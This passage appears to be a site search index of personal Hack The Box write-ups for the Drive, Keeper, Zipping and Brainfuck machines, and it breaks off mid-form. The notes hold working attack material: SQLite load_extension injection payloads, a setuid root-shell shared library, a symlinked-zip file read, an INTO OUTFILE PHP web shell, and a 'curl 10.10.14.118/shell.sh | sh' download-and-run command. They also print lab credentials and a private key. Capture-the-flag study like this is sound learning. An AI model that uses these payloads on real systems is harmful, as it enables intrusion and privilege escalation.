README.md, doodleGrive-cli</p> </li> </ul> <pre><code>Hi team\nafter the great success of DoodleGrive, we are planning now to start working on our new project: \"DoodleGrive self hosted\",it will allow our customers to deploy their own documents sharing platform privately on thier servers...\nHowever in addition with the \"new self Hosted release\" there should be a tool(doodleGrive-cli) to help the IT team in monitoring server status and fix errors that may happen.\nAs we mentioned in the last meeting the tool still in the development phase and we should test it properly...\nWe sent the username and the password in the email for every user to help us in testing the tool and make it better.\nIf you face any problem, please report it to the development team.\nBest regards.\n</code></pre> <p>? DoodleGrive self hosted -&gt; monitor server status -&gt; unchangable script -&gt; find doodleGrive elf file</p> <p>? username:passwd -&gt; email mesg -&gt; how to find -&gt; [x]</p> <ul> <li>linpeas + pspy -&gt; nothing [x]</li> </ul>"},{"location":"Write-ups/thb/active_machines/Drive/#doodlegrive-reversing","title":"doodleGrive reversing","text":"<ul> <li>find cred: moriarty:findMeIfY0uC@nMr.Holmz!</li> </ul> <pre><code>tom@drive:~$ ./doodleGrive-cli\n[!]Caution this tool still in the development phase...please report any issue to the development team[!]\nEnter Username:\nmoriarty\nEnter password for moriarty:\nfindMeIfY0uC@nMr.Holmz!\nWelcome...!\n\ndoodleGrive cli beta-2.2:\n1. Show users list and info\n2. Show groups list\n3. Check server health and status\n4. Show server requests log (last 1000 request)\n5. activate user account\n6. Exit\n</code></pre> <ul> <li>understand program flow -&gt; find an interesting option, 5 activate user account</li> </ul> <ul> <li>get sql command: <code>/usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlit3 -line UPDATE accounts_customuser SET is_active=1 WHERE username=\"**%s**\";</code></li> <li>sqlite command injection, PayloadsAllTheThings/SQL Injection/SQLite Injection.md at master \u00b7 swisskyrepo/PayloadsAllTheThings (github.com)</li> <li>shared library exploit</li> <li>char(xx,xx,xx) -&gt; bypass sanitize_string()</li> <li> <p>payload: <code>%s -&gt; root\" UNION SELECT 1,load_extension('./a');-- -</code> or <code>%s -&gt; root\";load_extension('./a');-- -</code> -&gt; <code>root\";+load_extension(char(46,47,97))--</code> or <code>root\"+UNION+SELECT+1,load_extension(char(46,47,97))--</code></p> </li> <li> <p><code>gcc -fPIC -shared -o a.so a.c</code></p> </li> </ul> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstatic void inject() __attribute__((constructor));\nvoid inject() {\n    setuid(0);\n    setgid(0);\n    system(\"/bin/bash -p\");\n}\n</code></pre>"},{"location":"Write-ups/thb/active_machines/Drive/#tom-root","title":"tom -&gt; root","text":"<ul> <li>./doodleGrive-cli -&gt; choose 5 -&gt; input payload -&gt; export PATH -&gt; root shell</li> </ul>"},{"location":"Write-ups/thb/active_machines/Keeper/","title":"Keeper","text":""},{"location":"Write-ups/thb/active_machines/Keeper/#recon","title":"Recon","text":"<pre><code># Nmap 7.94 scan initiated Wed Nov 22 06:51:04 2023 as: nmap -sT -sV -sC -O -p 22,80 -oA nmap/detail 10.10.11.227\nNmap scan report for 10.10.11.227\nHost is up (0.043s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)\n|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: nginx/1.18.0 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Wed Nov 22 06:51:16 2023 -- 1 IP address (1 host up) scanned in 11.73 seconds\n</code></pre>"},{"location":"Write-ups/thb/active_machines/Keeper/#foothold","title":"Foothold","text":""},{"location":"Write-ups/thb/active_machines/Keeper/#ticketskeeperhtb","title":"tickets.keeper.htb","text":"<pre><code>&lt;html&gt;\n  &lt;body&gt;\n    &lt;a href=\"http://tickets.keeper.htb/rt/\"&gt;To raise an IT support ticket, please visit tickets.keeper.htb/rt/&lt;/a&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <ul> <li>jump to another site</li> <li>some info</li> </ul> <pre><code>4.4.4+dfsg-2ubuntu1 \nsales@bestpractical.com.\n</code></pre> <ul> <li> <p>login page: default password (bestpracticing) -&gt; root:password</p> </li> <li> <p>find sqli: https://www.exploit-db.com/exploits/38459 [x], sqlmap [x]</p> </li> <li>find another user</li> </ul> <p></p> <ul> <li>get cred from his main page -&gt; lnorgaard:Welcome2023!</li> </ul> <p></p>"},{"location":"Write-ups/thb/active_machines/Keeper/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Write-ups/thb/active_machines/Keeper/#ssh-lnorgaard","title":"ssh -&gt; lnorgaard","text":"<ul> <li>basic enumeration</li> </ul> <pre><code>lnorgaard@keeper:~$ sudo -l\n[sudo] password for lnorgaard:\nSorry, user lnorgaard may not run sudo on keeper.\n\nlnorgaard@keeper:~$ uname -a\nLinux keeper 5.15.0-78-generic #85-Ubuntu SMP Fri Jul 7 15:25:09 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\nlnorgaard@keeper:~$ ip a\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host\n       valid_lft forever preferred_lft forever\n2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000\n    link/ether 00:50:56:b9:c5:39 brd ff:ff:ff:ff:ff:ff\n    altname enp3s0\n    altname ens160\n    inet 10.10.11.227/23 brd 10.10.11.255 scope global eth0\n       valid_lft forever preferred_lft forever\n    inet6 dead:beef::250:56ff:feb9:c539/64 scope global dynamic mngtmpaddr\n       valid_lft 86399sec preferred_lft 14399sec\n    inet6 fe80::250:56ff:feb9:c539/64 scope link\n       valid_lft forever preferred_lft forever\n\n\n\nlnorgaard@keeper:~$ netstat -tuln\nActive Internet connections (only servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State\ntcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN\ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN\ntcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN\ntcp6       0      0 ::1:25                  :::*                    LISTEN\ntcp6       0      0 :::80                   :::*                    LISTEN\ntcp6       0      0 :::22                   :::*                    LISTEN\nudp        0      0 127.0.0.53:53           0.0.0.0:*\nudp        0      0 0.0.0.0:68              0.0.0.0:*\n</code></pre> <ul> <li>zip file, unzip it, get two related pass-files</li> </ul> <pre><code>two special files\n-rwxr-x--- 1 lnorgaard lnorgaard 253395188 May 24 12:51 KeePassDumpFull.dmp\n-rwxr-x--- 1 lnorgaard lnorgaard      3630 May 24 12:51 passcodes.kdbx\n</code></pre>"},{"location":"Write-ups/thb/active_machines/Keeper/#lnorgaard-root","title":"lnorgaard -&gt; root","text":"<ul> <li> <p>cracking these two files</p> </li> <li> <p>vdohney/keepass-password-dumper: Original PoC for CVE-2023-32784 (github.com) -&gt; crack x.dmp to get some ambiguous master password</p> </li> </ul> <pre><code>$ cat passwds\n\u25cf\u00f8dgr\u00f8d med fl\u00f8de\n\u25cf\u00cfdgr\u00f8d med fl\u00f8de\n\u25cf,dgr\u00f8d med fl\u00f8de\n\u25cfldgr\u00f8d med fl\u00f8de\n\u25cf`dgr\u00f8d med fl\u00f8de\n\u25cf-dgr\u00f8d med fl\u00f8de\n\u25cf'dgr\u00f8d med fl\u00f8de\n\u25cf]dgr\u00f8d med fl\u00f8de\n\u25cf\u00a7dgr\u00f8d med fl\u00f8de\n\u25cfAdgr\u00f8d med fl\u00f8de\n\u25cfIdgr\u00f8d med fl\u00f8de\n\u25cf:dgr\u00f8d med fl\u00f8de\n\u25cf=dgr\u00f8d med fl\u00f8de\n\u25cf_dgr\u00f8d med fl\u00f8de\n\u25cfcdgr\u00f8d med fl\u00f8de\n\u25cfMdgr\u00f8d med fl\u00f8de\n</code></pre> <ol> <li>google it based on the concrete text -&gt; get a meaningful phrase -&gt; r\u00f8dgr\u00f8d med fl\u00f8de</li> </ol> <p></p> <ol> <li>crack x.kdbx to get putty-format private key</li> </ol> <p></p> <ol> <li>use puttygen based on private key to generate ssh private key</li> </ol> <pre><code>$ cat key\nPuTTY-User-Key-File-3: ssh-rsa\nEncryption: none\nComment: rsa-key-20230519\nPublic-Lines: 6\nAAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D\n8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T\nEHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM\nCj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu\nFVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ\nLxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et\nPrivate-Lines: 14\nAAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j\noDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih\nkmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY\nf7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT\nVkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz\nUXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs\nOxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz\nin6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r\nSsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV\n09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa\nxHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA\nAACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD\nAF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy\nNNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=\nPrivate-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0\n\n$ puttygen key -O private-openssh -o id_rsa\n\n$ chmod 600 id_rsa\n</code></pre> <ol> <li>ssh root using this private key, id_rsa</li> </ol> <pre><code>$ ssh -i id_rsa root@10.10.11.227\nWelcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nYou have new mail.\nLast login: Tue Aug  8 19:00:06 2023 from 10.10.14.41\nroot@keeper:~# ls\nroot.txt  RT30000.zip  SQL\n</code></pre>"},{"location":"Write-ups/thb/active_machines/Zipping/","title":"Zipping","text":""},{"location":"Write-ups/thb/active_machines/Zipping/#machine","title":"Machine","text":""},{"location":"Write-ups/thb/active_machines/Zipping/#recon","title":"Recon","text":"<ul> <li><code>nmap -sT -sV -sC -O -p 22,80 -oA nmap/detail 10.10.11.229</code></li> </ul> <pre><code>PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)\n|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)\n80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))\n|_http-title: Zipping | Watch store\n|_http-server-header: Apache/2.4.54 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <ul> <li>attack vector: 22-ssh, 80-http</li> <li>Path of 80, <code>gobuster dir -u http://10.10.11.229/shop/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x json,html,php,txt,xml,md -t 50</code></li> </ul> <pre><code>/home.php             (Status: 500) [Size: 0]\n/products.php         (Status: 500) [Size: 0]\n/index.php            (Status: 200) [Size: 2615]\n/product.php          (Status: 200) [Size: 15]\n/.php                 (Status: 403) [Size: 277]\n/.html                (Status: 403) [Size: 277]\n/assets               (Status: 301) [Size: 318] [--&gt; http://10.10.11.229/shop/assets/]\n/cart.php             (Status: 500) [Size: 1]\n/functions.php        (Status: 200) [Size: 0]\n/.html                (Status: 403) [Size: 277]\n/.php                 (Status: 403) [Size: 277]\n</code></pre> <ul> <li>Dir of 80, <code>dirb http://10.10.11.229</code></li> </ul> <pre><code>---- Scanning URL: http://10.10.11.229/ ----\n==&gt; DIRECTORY: http://10.10.11.229/assets/\n+ http://10.10.11.229/index.php (CODE:200|SIZE:16738)\n+ http://10.10.11.229/server-status (CODE:403|SIZE:277)\n==&gt; DIRECTORY: http://10.10.11.229/shop/\n==&gt; DIRECTORY: http://10.10.11.229/uploads/\n\n---- Entering directory: http://10.10.11.229/assets/ ----\n(!) WARNING: Directory IS LISTABLE. No need to scan it.\n    (Use mode '-w' if you want to scan it anyway)\n\n---- Entering directory: http://10.10.11.229/shop/ ----\n==&gt; DIRECTORY: http://10.10.11.229/shop/assets/\n+ http://10.10.11.229/shop/index.php (CODE:200|SIZE:2615)\n\n---- Entering directory: http://10.10.11.229/uploads/ ----\n\n---- Entering directory: http://10.10.11.229/shop/assets/ ----\n</code></pre>"},{"location":"Write-ups/thb/active_machines/Zipping/#foothold","title":"Foothold","text":""},{"location":"Write-ups/thb/active_machines/Zipping/#80-http","title":"80 - http","text":"<p>attack vectors:</p> <ul> <li>http://10.10.11.229/#</li> <li>http://10.10.11.229/shop/</li> <li>http://10.10.11.229/upload.php -&gt; upload zip file (The unzipped file must have a .pdf extension.)</li> </ul>"},{"location":"Write-ups/thb/active_machines/Zipping/#exp-upload","title":"exp - upload","text":"<ul> <li>change filename and content-type: application/x-php inside http repest [x]</li> <li>zip <code>--symlinks</code> -&gt; create zip using sensitive file link (e.g. /etc/passwd)</li> <li><code>ln -s /etc/passwd 1.pdf &amp;&amp; zip --symlinks 1.zip 1.pdf</code></li> </ul> <ul> <li>leak /home/rektsu/.ssh/id_rsa [x]</li> <li>users: root, rektsu</li> </ul>"},{"location":"Write-ups/thb/active_machines/Zipping/#exp-file-leakage-code-audit-sqli-get-shell","title":"exp - file leakage -&gt; code audit - &gt; sqli -&gt; get shell","text":"<ul> <li>index.php</li> </ul> <pre><code>&lt;?php\nsession_start();\n// Include functions and connect to the database using PDO MySQL\ninclude 'functions.php';\n$pdo = pdo_connect_mysql();\n// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.\n$page = isset($_GET['page']) &amp;&amp; file_exists($_GET['page'] . '.php') ? $_GET['page'] : 'home';\n// Include and show the requested page\ninclude $page . '.php';\n?&gt;\n</code></pre> <ul> <li>product.php -&gt; id injection point [x]</li> </ul> <pre><code>&lt;?php\n// Check to make sure the id parameter is specified in the URL\nif (isset($_GET['id'])) {\n    $id = $_GET['id'];\n    // Filtering user input for letters or special characters\n    if(preg_match(\"/^.*[A-Za-z!#$%^&amp;*()\\-_=+{}\\[\\]\\\\|;:'\\\",.&lt;&gt;\\/?]|[^0-9]$/\", $id, $match)) {\n        header('Location: index.php');\n    } else {\n        // Prepare statement and execute, but does not prevent SQL injection\n        $stmt = $pdo-&gt;prepare(\"SELECT * FROM products WHERE id = '$id'\");\n        $stmt-&gt;execute();\n        // Fetch the product from the database and return the result as an Array\n        $product = $stmt-&gt;fetch(PDO::FETCH_ASSOC);\n        // Check if the product exists (array is not empty)\n        if (!$product) {\n            // Simple error to display if the id for the product doesn't exists (array is empty)\n            exit('Product does not exist!');\n        }\n    }\n} else {\n    // Simple error to display if the id wasn't specified\n    exit('No ID provided!');\n}\n?&gt;\n</code></pre> <ul> <li>functions.php -&gt; root:MySQL_P@ssw0rd!</li> </ul> <pre><code>&lt;?php\nfunction pdo_connect_mysql() {\n    // Update the details below with your MySQL details\n    $DATABASE_HOST = 'localhost';\n    $DATABASE_USER = 'root';\n    $DATABASE_PASS = 'MySQL_P@ssw0rd!';\n    $DATABASE_NAME = 'zipping';\n    try {\n        return new PDO('mysql:host=' . $DATABASE_HOST . ';dbname=' . $DATABASE_NAME . ';charset=utf8', $DATABASE_USER, $DATABASE_PASS);\n    } catch (PDOException $exception) {\n        // If there is an error with the connection, stop the script and display the error.\n        exit('Failed to connect to database!');\n    }\n}\n// Template header, feel free to customize this\nfunction template_header($title) {\n$num_items_in_cart = isset($_SESSION['cart']) ? count($_SESSION['cart']) : 0;\necho &lt;&lt;&lt;EOT\n&lt;!DOCTYPE html&gt;\n</code></pre> <ul> <li>products.php -&gt; sqli, p [x]</li> </ul> <pre><code>&lt;?php\n// The amounts of products to show on each page\n$num_products_on_each_page = 4;\n// The current page - in the URL, will appear as index.php?page=products&amp;p=1, index.php?page=products&amp;p=2, etc...\n$current_page = isset($_GET['p']) &amp;&amp; is_numeric($_GET['p']) ? (int)$_GET['p'] : 1;\n// Select products ordered by the date added\n$stmt = $pdo-&gt;prepare('SELECT * FROM products ORDER BY date_added DESC LIMIT ?,?');\n// bindValue will allow us to use an integer in the SQL statement, which we need to use for the LIMIT clause\n$stmt-&gt;bindValue(1, ($current_page - 1) * $num_products_on_each_page, PDO::PARAM_INT);\n$stmt-&gt;bindValue(2, $num_products_on_each_page, PDO::PARAM_INT);\n$stmt-&gt;execute();\n// Fetch the products from the database and return the result as an Array\n$products = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);\n// Get the total number of products\n$total_products = $pdo-&gt;query('SELECT * FROM products')-&gt;rowCount();\n?&gt;\n</code></pre> <ul> <li> <p>cart.php -&gt; http://10.10.11.229/shop/index.php?page=cart -&gt; product_id is not precompiled -&gt; sqli</p> </li> <li> <p>how to bypass pre_match -&gt; PHP Tricks - HackTricks</p> </li> <li>%0A -&gt; bypass</li> <li><code>quantity=1&amp;product_id=1%0A';sql statement</code></li> <li><code>select 'php_cmd' into outfile 'filename' -- -</code> -&gt; filename [?] -&gt; secure_file_priv</li> <li>The default value of MySQL's secure_file_priv system variable may vary in different versions and configurations. In MySQL 5.7.6 and later, if you do not explicitly set this value during installation, the default value is usually set to the MySQL server's data directory. -&gt; /var/lib/mysql/</li> <li>POC: <code>1%0A';select '&lt;?php phpinfo();?&gt;' into outfile '/var/lib/mysql/a.php' -- -1</code></li> <li>Payload: <code>1%0A';select '&lt;?php system($_GET[\"cmd\"]);?&gt;' into outfile '/var/lib/mysql/b.php' -- -1</code></li> </ul> <pre><code>&lt;?php\n// If the user clicked the add to cart button on the product page we can check for the form data\nif (isset($_POST['product_id'], $_POST['quantity'])) {\n    // Set the post variables so we easily identify them, also make sure they are integer\n    $product_id = $_POST['product_id'];\n    $quantity = $_POST['quantity'];\n    // Filtering user input for letters or special characters\n    if(preg_match(\"/^.*[A-Za-z!#$%^&amp;*()\\-_=+{}\\[\\]\\\\|;:'\\\",.&lt;&gt;\\/?]|[^0-9]$/\", $product_id, $match) || preg_match(\"/^.*[A-Za-z!#$%^&amp;*()\\-_=+{}[\\]\\\\|;:'\\\",.&lt;&gt;\\/?]/i\", $quantity, $match)) {\n        echo '';\n    } else {\n        // Construct the SQL statement with a vulnerable parameter\n        $sql = \"SELECT * FROM products WHERE id = '\" . $_POST['product_id'] . \"'\";\n        // Execute the SQL statement without any sanitization or parameter binding\n        $product = $pdo-&gt;query($sql)-&gt;fetch(PDO::FETCH_ASSOC);\n        // Check if the product exists (array is not empty)\n        if ($product &amp;&amp; $quantity &gt; 0) {\n            // Product exists in database, now we can create/update the session variable for the cart\n            if (isset($_SESSION['cart']) &amp;&amp; is_array($_SESSION['cart'])) {\n                if (array_key_exists($product_id, $_SESSION['cart'])) {\n                    // Product exists in cart so just update the quanity\n                    $_SESSION['cart'][$product_id] += $quantity;\n                } else {\n                    // Product is not in cart so add it\n                    $_SESSION['cart'][$product_id] = $quantity;\n                }\n            } else {\n                // There are no products in cart, this will add the first product to cart\n                $_SESSION['cart'] = array($product_id =&gt; $quantity);\n            }\n        }\n        // Prevent form resubmission...\n        header('location: index.php?page=cart');\n        exit;\n    }\n}\n</code></pre> <ul> <li>http://10.10.11.229/shop/index.php?page=/var/lib/mysql/b&amp;cmd=id</li> <li>http://10.10.11.229/shop/index.php?page=/var/lib/mysql/b&amp;cmd=curl 10.10.14.118/shell.sh | sh </li> </ul> <p></p>"},{"location":"Write-ups/thb/active_machines/Zipping/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"Write-ups/thb/active_machines/Zipping/#rektsu-root","title":"rektsu -&gt; root","text":"<ul> <li><code>sudo -l</code> -&gt; <code>sudo /usr/bin/stock</code></li> </ul> <pre><code>rektsu@zipping:/var/www/html/shop$ sudo -l                             \nsudo -l\nMatching Defaults entries for rektsu on zipping:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser rektsu may run the following commands on zipping:\n    (ALL) NOPASSWD: /usr/bin/stock  \n</code></pre>"},{"location":"Write-ups/thb/active_machines/Zipping/#pwn-stock","title":"pwn stock","text":"<ul> <li>file it</li> </ul> <pre><code>rektsu@zipping:/var/www/html/shop$ file /usr/bin/stock               \nfile /usr/bin/stock\n/usr/bin/stock: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=aa34d8030176fe286f8011c9d4470714d188ab42, for GNU/Linux 3.2.0, not stripped\n</code></pre> <ul> <li>reverse it</li> <li>find password -&gt; St0ckM4nager</li> <li>understand program flow</li> </ul> <ul> <li>check shared libs</li> <li>ldd /usr/bin/stock</li> <li>objdump -p /usr/bin/stock | grep NEEDED</li> <li>strace /usr/bin/stock (input the correct password)</li> </ul> <ul> <li>shared library exp -&gt; <code>gcc -fPIC -shared -o libcounter.so /tmp/libcounter.c</code> -&gt; sudo /usr/bin/stock -&gt; get root shell</li> </ul> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstatic void inject() __attribute__((constructor));\n\nvoid inject() {\n    setuid(0);\n    setgid(0);\n    system(\"/bin/bash -p\");\n}\n</code></pre>"},{"location":"Write-ups/thb/linux/Brainfuck/","title":"Brainfuck (Insane)","text":""},{"location":"Write-ups/thb/linux/Brainfuck/#machine-info","title":"Machine Info","text":""},{"location":"Write-ups/thb/linux/Brainfuck/#recon","title":"Recon","text":"<pre><code>PORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)\n|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)\n|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)\n25/tcp  open  smtp     Postfix smtpd\n|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN\n110/tcp open  pop3     Dovecot pop3d\n|_pop3-capabilities: RESP-CODES PIPELINING UIDL USER SASL(PLAIN) CAPA TOP AUTH-RESP-CODE\n143/tcp open  imap     Dovecot imapd\n|_imap-capabilities: SASL-IR capabilities more IMAP4rev1 have post-login AUTH=PLAINA0001 ENABLE listed ID OK LOGIN-REFERRALS LITERAL+ Pre-login IDLE\n443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)\n|_ssl-date: TLS randomness does not represent time\n| tls-nextprotoneg:\n|_  http/1.1\n|_http-title: Welcome to nginx!\n| tls-alpn:\n|_  http/1.1\n| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR\n| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb\n| Not valid before: 2017-04-13T11:19:29\n|_Not valid after:  2027-04-11T11:19:29\n|_http-server-header: nginx/1.10.0 (Ubuntu)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|specialized|phone|storage-misc\nRunning (JUST GUESSING): Linux 3.X|4.X|5.X (90%), Crestron 2-Series (86%), Google Android 4.X (86%), HP embedded (85%)\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/o:google:android:4.0 cpe:/o:linux:linux_kernel:5.0 cpe:/h:hp:p2000_g3\nAggressive OS guesses: Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.16 (90%), Linux 3.16 - 4.6 (90%), Linux 3.2 - 4.9 (90%), Linux 3.8 - 3.11 (90%), Linux 4.2 (90%), Linux 4.4 (90%)\nNo exact OS matches for host (test conditions non-ideal).\nService Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <ul> <li> <p>attack vector: 25 smtp - 110 pop3 - 143 imap (email), 443 ssl, domains:</p> <ul> <li>www.brainfuck.htb<ul> <li>brainfuck.htb</li> <li>sup3rs3cr3t.brainfuck.htb</li> <li>subdomain scan, <code>gobuster vhost -k --domain $base_domain --append-domain -u $target -w $wordlist</code></li> </ul> </li> </ul> </li> <li> <p>visit using https protocal</p> </li> </ul> <p></p> <ul> <li>user: orestis@brainfuck.htb</li> <li>machine info: WordPress 4.7.3</li> </ul>"},{"location":"Write-ups/thb/linux/Brainfuck/#foothold","title":"Foothold","text":""},{"location":"Write-ups/thb/linux/Brainfuck/#443-wp-login-as-admin","title":"443 - wp - login as admin","text":""},{"location":"Write-ups/thb/linux/Brainfuck/#enum","title":"enum","text":"<p>URLs:</p> <ul> <li>https://brainfuck.htb/</li> <li>https://brainfuck.htb/wp-login.php</li> <li>https://brainfuck.htb/wp-admin</li> </ul> <p>Enum:</p> <ul> <li><code>$ wpscan --url https://brainfuck.htb --enumerate u --disable-tls-checks</code></li> </ul> <p></p> <p></p> <ul> <li>attack vector: theme proficient and plugin wp-support-plus-responsive-ticket-system out of date</li> <li>user: admin, administrator</li> </ul> <p>wp plugin exploit:</p> <ul> <li>searchsploit</li> </ul> <p></p>"},{"location":"Write-ups/thb/linux/Brainfuck/#40939-wp-support-plugin-responsive-ticket-system-713-sql-injection","title":"40939 wp support plugin - Responsive Ticket System 7.1.3 - SQL Injection","text":"<ul> <li>WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection - PHP webapps Exploit (exploit-db.com)</li> <li>create a page on local and visit it</li> </ul> <pre><code>&lt;form method=\"post\" action=\"https://brainfuck.htb/wp-admin/admin-ajax.php\"&gt;\n        Username: &lt;input type=\"text\" name=\"username\" value=\"admin\"&gt;\n        &lt;input type=\"hidden\" name=\"email\" value=\"orestis@brainfuck.htb\"&gt;\n        &lt;input type=\"hidden\" name=\"action\" value=\"loginGuestFacebook\"&gt;\n        &lt;input type=\"submit\" 